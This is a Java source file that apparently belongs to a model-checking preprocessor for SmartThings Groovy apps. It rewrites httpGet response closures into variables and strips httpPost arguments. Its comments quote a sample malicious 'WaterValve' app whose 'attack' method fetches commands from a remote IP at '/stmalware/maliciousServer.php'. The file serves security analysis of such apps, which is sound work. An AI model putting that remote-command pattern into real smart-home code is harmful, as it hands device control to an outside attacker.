package edu.ksu.cis.bandera.jjjc.gparser.smartapppreprocessor;

import java.util.ArrayList;
import java.util.List;

import org.codehaus.groovy.ast.ClassNode;
import org.codehaus.groovy.ast.MethodNode;
import org.codehaus.groovy.ast.Parameter;
import org.codehaus.groovy.ast.expr.BinaryExpression;
import org.codehaus.groovy.ast.expr.BooleanExpression;
import org.codehaus.groovy.ast.expr.ClosureExpression;
import org.codehaus.groovy.ast.expr.Expression;
import org.codehaus.groovy.ast.expr.MethodCallExpression;
import org.codehaus.groovy.ast.expr.PropertyExpression;
import org.codehaus.groovy.ast.expr.VariableExpression;
import org.codehaus.groovy.ast.stmt.BlockStatement;
import org.codehaus.groovy.ast.stmt.BreakStatement;
import org.codehaus.groovy.ast.stmt.DoWhileStatement;
import org.codehaus.groovy.ast.stmt.EmptyStatement;
import org.codehaus.groovy.ast.stmt.ExpressionStatement;
import org.codehaus.groovy.ast.stmt.ForStatement;
import org.codehaus.groovy.ast.stmt.IfStatement;
import org.codehaus.groovy.ast.stmt.ReturnStatement;
import org.codehaus.groovy.ast.stmt.Statement;
import org.codehaus.groovy.ast.stmt.WhileStatement;

import edu.ksu.cis.bandera.jjjc.gparser.util.GUtil;

/* Before:
className = WaterValve
currMethName = attack 
httpGet("http://141.212.110.244/stmalware/maliciousServer.php") { resp ->
	if(resp.status == 200)
	{
		state.attack = resp.data.toString()
	}
	else
	{
		log.error "unknown response"
	}
}
After:
if(WaterValve_attack_status == 200)
{
	state.attack = WaterValve_attack_data
}
else
{
	log.error "unknown response"
}
 * */
public class GHttpExprTransformer {
	/********************************************/
	private List<String> httpGetVarList;
	private String currMethName;
	private String className;
	/********************************************/
	
	public GHttpExprTransformer() {
		this.httpGetVarList = new ArrayList<String>();
	}
	
	/* Getters */
	public List<String> getHttpGetVarList()
	{
		return this.httpGetVarList;
	}
	
	/* Before: 
	 * resp.status == 200
	 * state.attack = resp.data.toString()
	 * After: 
	 * WaterValve_attack_status == 200
	 * state.attack = WaterValve_attack_data
	 * */
	private Expression createNewExpression(Expression expr, List<String> httpGetParmList)
	{
		Expression result = expr;
		
		if(expr instanceof PropertyExpression)
		{
			Expression objExpr = ((PropertyExpression) expr).getObjectExpression();
			
			if(objExpr instanceof VariableExpression)
			{
				String varName = ((VariableExpression) objExpr).getName();
				
				if(httpGetParmList.contains(varName))
				{
					/* WaterValve_attack_status */
					String newVarName = this.className + "_" + this.currMethName + "_" + ((PropertyExpression) expr).getPropertyAsString();
					
					this.httpGetVarList.add(newVarName);
					result = new VariableExpression(newVarName);
				}
			}
		}
		else if(expr instanceof MethodCallExpression)
		{
			MethodCallExpression mce = ((MethodCallExpression) expr);
			Expression objExpr = mce.getObjectExpression();
			Expression newObjExpr = this.createNewExpression(objExpr, httpGetParmList); 
			
			if(mce.getMethodAsString().equals("toString"))
			{
				result = newObjExpr;
			}
			else
			{
				result = new MethodCallExpression(newObjExpr, mce.getMethod(), mce.getArguments());
			}
		}
		else if(expr instanceof BinaryExpression)
		{
			BinaryExpression bex = (BinaryExpression)expr;
			Expression newLeftExpr = this.createNewExpression(bex.getLeftExpression(), httpGetParmList);
			Expression newRightExpr = this.createNewExpression(bex.getRightExpression(), httpGetParmList);
			
			result = new BinaryExpression(newLeftExpr, bex.getOperation(), newRightExpr);
		}
			
		return result;
	}
	
	/* This method is used to transform the content of the closure
	 * Before: 
	 * resp.status == 200
	 * state.attack = resp.data.toString()
	 * After: 
	 * WaterValve_attack_status == 200
	 * state.attack = WaterValve_attack_data
	 * */
	private void transformExprForABlock(Statement gStmt, List<String> httpGetParmList)
	{
		if(gStmt instanceof BlockStatement)
		{
			List<Statement> gStmtList = ((BlockStatement)gStmt).getStatements();
			
			for(int i = 0; i < gStmtList.size(); i++)
			{
				Statement gSubStmt = gStmtList.get(i);
				
				if(gSubStmt instanceof ExpressionStatement)
				{
					Expression newExpr = this.createNewExpression(((ExpressionStatement)gSubStmt).getExpression(), httpGetParmList);
					((ExpressionStatement)gSubStmt).setExpression(newExpr);
				}
				else if(gSubStmt instanceof IfStatement)
				{
					Expression oldExpr = ((IfStatement)gSubStmt).getBooleanExpression().getExpression();
					Expression newExpr = this.createNewExpression(oldExpr, httpGetParmList);
					((IfStatement)gSubStmt).setBooleanExpression(new BooleanExpression(newExpr));
					
					/* Handle ifBlock and elseBlock of an IfStatement */
					this.transformExprForABlock(((IfStatement) gSubStmt).getIfBlock(), httpGetParmList); 
					this.transformExprForABlock(((IfStatement) gSubStmt).getElseBlock(), httpGetParmList);
				}
				else if(gSubStmt instanceof WhileStatement)
				{
					Expression oldExpr = ((WhileStatement)gSubStmt).getBooleanExpression().getExpression();
					Expression newExpr = this.createNewExpression(oldExpr, httpGetParmList);
					((WhileStatement)gSubStmt).setBooleanExpression(new BooleanExpression(newExpr));
					
					/* Handle loopBlock of WhileStatement */
					this.transformExprForABlock(((WhileStatement) gSubStmt).getLoopBlock(), httpGetParmList);
				}
				else if(gSubStmt instanceof DoWhileStatement)
				{
					Expression oldExpr = ((DoWhileStatement)gSubStmt).getBooleanExpression().getExpression();
					Expression newExpr = this.createNewExpression(oldExpr, httpGetParmList);
					((DoWhileStatement)gSubStmt).setBooleanExpression(new BooleanExpression(newExpr));
					
					/* Handle loopBlock of DoWhileStatement */
					this.transformExprForABlock(((DoWhileStatement) gSubStmt).getLoopBlock(), httpGetParmList);
				}
				else if(gSubStmt instanceof ForStatement)
				{
					/* Handle loopBlock of ForStatement */
					this.transformExprForABlock(((ForStatement) gSubStmt).getLoopBlock(), httpGetParmList);
				}
				else if(gSubStmt instanceof ReturnStatement)
				{
					Expression newExpr = this.createNewExpression(((ReturnStatement)gSubStmt).getExpression(), httpGetParmList);
					((ReturnStatement)gSubStmt).setExpression(newExpr);
				}
				else if(gSubStmt instanceof BreakStatement)
				{}
				else
				{
					System.out.println("[GHttpExprTransformer.transformExprForABlock] unexpected statement type: " + gSubStmt);
				}
			}
		}
		else if(gStmt instanceof IfStatement)
		{
			Expression oldExpr = ((IfStatement)gStmt).getBooleanExpression().getExpression();
			Expression newExpr = this.createNewExpression(oldExpr, httpGetParmList);
			((IfStatement)gStmt).setBooleanExpression(new BooleanExpression(newExpr));
			
			/* Handle ifBlock and elseBlock of an IfStatement */
			this.transformExprForABlock(((IfStatement) gStmt).getIfBlock(), httpGetParmList); 
			this.transformExprForABlock(((IfStatement) gStmt).getElseBlock(), httpGetParmList);
		}
		else if(!(gStmt instanceof EmptyStatement))
		{
			System.out.println("[GHttpExprTransformer.transformExprForABlock] a wrong call!!!");
		}
	}
	
	public void processAClassNode(ClassNode classNode)
	{
		this.className = classNode.getName();
		
		for(MethodNode meth : classNode.getMethods())
		{
			this.currMethName = meth.getName();
			this.handleABlock(meth.getCode());
		}
	}
	
	private void handleABlock(Statement gStmt)
	{
		if(gStmt instanceof BlockStatement)
		{
			List<Statement> gStmtList = ((BlockStatement)gStmt).getStatements();
			
			for(int i = 0; i < gStmtList.size(); i++)
			{
				Statement gSubStmt = gStmtList.get(i);
				
				if(gSubStmt instanceof ExpressionStatement)
				{
					Expression expr = ((ExpressionStatement)gSubStmt).getExpression();
					
					if(expr instanceof MethodCallExpression)
					{
						MethodCallExpression mce = (MethodCallExpression)expr;
						String methName = mce.getMethodAsString();
						
						if(methName != null)
						{
							if(methName.equals("httpGet"))
							{
								List<Expression> argList = GUtil.buildExprList(mce.getArguments());
								ClosureExpression closureExpr = null;
								
								for(Expression arg : argList)
								{
									if(arg instanceof ClosureExpression)
									{
										closureExpr = (ClosureExpression)arg;
										break;
									}
								}
								
								if(closureExpr != null)
								{
									List<String> httpGetParmList = new ArrayList<String>();
									Statement closureCode = closureExpr.getCode();
									
									for(Parameter parm : closureExpr.getParameters())
									{
										httpGetParmList.add(parm.getName());
									}
									this.transformExprForABlock(closureCode, httpGetParmList);
									gStmtList.set(i, closureCode);
								}
							}
							else if(methName.equals("httpPost"))
							{
								/* Remove the arguments 
								 * */
								mce.setArguments(MethodCallExpression.NO_ARGUMENTS);
							}
						}
					}
				}
				else if(gSubStmt instanceof IfStatement)
				{
					/* Handle ifBlock and elseBlock of an IfStatement */
					this.handleABlock(((IfStatement) gSubStmt).getIfBlock()); 
					this.handleABlock(((IfStatement) gSubStmt).getElseBlock());
				}
				else if(gSubStmt instanceof WhileStatement)
				{
					/* Handle loopBlock of WhileStatement */
					this.handleABlock(((WhileStatement) gSubStmt).getLoopBlock());
				}
				else if(gSubStmt instanceof DoWhileStatement)
				{
					/* Handle loopBlock of DoWhileStatement */
					this.handleABlock(((DoWhileStatement) gSubStmt).getLoopBlock());
				}
				else if(gSubStmt instanceof ForStatement)
				{
					/* Handle loopBlock of ForStatement */
					this.handleABlock(((ForStatement) gSubStmt).getLoopBlock());
				}
				else if(gSubStmt instanceof ReturnStatement)
				{}
				else if(gSubStmt instanceof BreakStatement)
				{}
				else if(gSubStmt instanceof BlockStatement)
				{
					this.handleABlock((BlockStatement) gSubStmt);
				}
				else
				{
					System.out.println("[GHttpExprTransformer.handleABlock] unexpected statement type: " + gSubStmt);
				}
			}
		}
		else if(gStmt instanceof IfStatement)
		{
			/* Handle ifBlock and elseBlock of an IfStatement */
			this.handleABlock(((IfStatement) gStmt).getIfBlock()); 
			this.handleABlock(((IfStatement) gStmt).getElseBlock());
		}
		else if(!(gStmt instanceof EmptyStatement))
		{
			System.out.println("[GHttpExprTransformer.handleABlock] a wrong call!!!");
		}
	}
	
	public static void main(String[] args)
	{
		int t = 124;
		String str = "" + t;
		System.out.println(str);
	}
}
